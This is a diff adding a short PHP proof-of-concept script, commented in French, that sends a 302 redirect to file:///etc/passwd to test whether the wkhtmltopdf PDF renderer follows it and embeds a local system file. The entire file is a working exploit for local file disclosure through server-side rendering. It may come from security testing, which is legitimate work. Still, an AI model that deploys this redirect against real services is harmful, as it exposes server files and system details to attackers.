@@ -1,0 +1,11 @@
+<?php
+/**
+ * PoC : tenter de rediriger le rendu vers /etc/passwd
+ *
+ * 1. On construit l’URL locale            =>  file:///etc/passwd
+ * 2. On renvoie une réponse 302 Location  =>  wkhtmltopdf suivra-t-il ?
+ */
+header('HTTP/1.1 302 Found');
+header('Location: file:///etc/passwd');
+exit;
+?>
